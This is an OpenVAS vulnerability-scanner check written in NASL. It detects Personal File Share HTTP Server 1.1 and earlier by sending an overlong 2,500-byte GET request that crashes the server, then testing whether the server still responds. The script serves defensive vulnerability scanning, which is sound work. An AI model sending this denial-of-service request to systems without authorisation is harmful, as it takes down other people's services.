###############################################################################
# OpenVAS Vulnerability Test
#
# Personal File Share HTTP Server Remote Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803196");
  script_version("2022-02-14T13:47:12+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2022-02-14 13:47:12 +0000 (Mon, 14 Feb 2022)");
  script_tag(name:"creation_date", value:"2013-05-02 13:34:27 +0530 (Thu, 02 May 2013)");
  script_name("Personal File Share HTTP Server Remote Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Apr/184");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/526480");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/personal-file-share-http-server-remote-overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");

  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will let remote unauthenticated attackers
  to cause a denial of service.");

  script_tag(name:"affected", value:"Personal File Share HTTP Server version 1.1 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling certain Long requests,
  which can be exploited to cause a denial of service.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_tag(name:"summary", value:"Personal File Share HTTP Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

res = http_get_cache(item:"/", port:port);
if(">Files From" >!< res && ">Web File Explore<" >!< res &&
   ">srplab.cn" >!< res){
  exit(0);
}

req = http_get(item:crap(data:"A", length:2500), port:port);
res = http_keepalive_send_recv(port:port, data:req);

req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(">Files From" >!< res && ">Web File Explore<" >!< res
                                 && ">srplab.cn" >!< res)
{
  security_message(port:port);
  exit(0);
}

exit(99);
